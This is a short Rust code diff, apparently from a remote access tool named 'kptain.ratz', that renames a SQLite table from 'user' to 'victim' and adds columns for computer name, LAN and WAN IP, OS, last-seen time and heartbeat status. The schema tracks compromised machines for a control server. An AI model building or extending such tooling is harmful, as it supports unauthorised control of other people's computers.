@@ -273,11 +273,16 @@ async fn main() -> io::Result<()> {
         let conn = Connection::open("/etc/kptain.ratz/datasave.db").unwrap();
         
         conn.execute(
-            "CREATE TABLE user (
+            "CREATE TABLE victim (
+            	logo TEXT,
                 id INTEGER PRIMARY KEY,
-                name TEXT,
-                ip TEXT,
-                autre TEXT);",NO_PARAMS,);
+                computername TEXT,
+                lanip TEXT,
+                wanip TEXT,
+                os TEXT,
+                lastseen TEXT,
+                hbstatus TEXT);",NO_PARAMS,);           
+                
             }
         
         let conn = Connection::open("/etc/kptain.ratz/datasave.db").unwrap();
